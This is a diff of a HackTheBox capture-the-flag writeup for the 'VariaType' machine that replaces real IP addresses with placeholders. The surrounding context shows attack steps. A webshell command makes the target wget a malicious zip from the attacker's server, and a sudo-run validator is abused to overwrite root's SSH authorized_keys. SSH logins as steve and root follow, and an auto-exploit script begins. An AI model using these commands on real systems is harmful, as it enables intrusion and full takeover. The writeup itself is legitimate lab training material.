@@ -1,6 +1,6 @@
 # VariaType (Avatar) - HackTheBox CTF Writeup
 
-**Target IP:** 10.129.7.194  
+**Target IP:** <Tareget_IP>  
 **Difficulty:** Medium  
 **Flags:**
 - user.txt: `<REDACTED_USER_FLAG>`
@@ -22,7 +22,7 @@
 
 ### Nmap Scan
 ```bash
-nmap -sC -sV -oN nmap.txt 10.129.7.194
+nmap -sC -sV -oN nmap.txt <Tareget_IP>
 ```
 
 **Results:**
@@ -35,7 +35,7 @@ PORT   STATE SERVICE VERSION
 ### Host Discovery
 ```bash
 # Add to /etc/hosts
-echo "10.129.7.194 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
+echo "<Tareget_IP> variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Git Repository Exposure
@@ -217,14 +217,14 @@ python3 make_evil_zip.py
 python3 -m http.server 8888 &
 
 # Download to target via webshell
-curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://10.10.14.241:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"
+curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://<Your_IP_Address>:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"
 
 # Wait 60 seconds for cron to process
 echo "Waiting for cron..."
 sleep 60
 
 # SSH as steve
-ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.7.194 "whoami && cat ~/user.txt"
+ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "whoami && cat ~/user.txt"
 ```
 
 **user.txt:** `<REDACTED_USER_FLAG>`
@@ -235,7 +235,7 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.7.194 "whoami && cat ~
 
 ### Step 10: Check Sudo Permissions
 ```bash
-ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.7.194 "sudo -l"
+ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "sudo -l"
 ```
 
 **Output:**
@@ -275,8 +275,8 @@ Run exploit:
 python3 serve_root_key.py &
 
 # Exploit with URL-encoded absolute path
-ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.7.194 \
-  "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.14.241:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
+ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> \
+  "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://<Your_IP_Address>:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
 ```
 
 **Output:**
@@ -287,7 +287,7 @@ ssh -o StrictHostKeyChecking=no -i steve_key steve@10.129.7.194 \
 
 ### Step 12: SSH as root
 ```bash
-ssh -o StrictHostKeyChecking=no -i root_key root@10.129.7.194 "whoami && cat /root/root.txt"
+ssh -o StrictHostKeyChecking=no -i root_key root@<Tareget_IP> "whoami && cat /root/root.txt"
 ```
 
 **root.txt:** `<REDACTED_ROOT_FLAG>`
@@ -302,12 +302,12 @@ ssh -o StrictHostKeyChecking=no -i root_key root@10.129.7.194 "whoami && cat /ro
 #!/bin/bash
 
 # VariaType (Avatar) - HackTheBox Auto-Exploit
-# Target: 10.129.7.194
+# Target: <Tareget_IP>
 
 set -e
 
-RHOST="10.129.7.194"
-LHOST="10.10.14.241"
+RHOST="<Tareget_IP>"
+LHOST="<Your_IP_Address>"
 
 echo "[*] VariaType Auto-Exploit"
 echo "[*] Target: $RHOST"
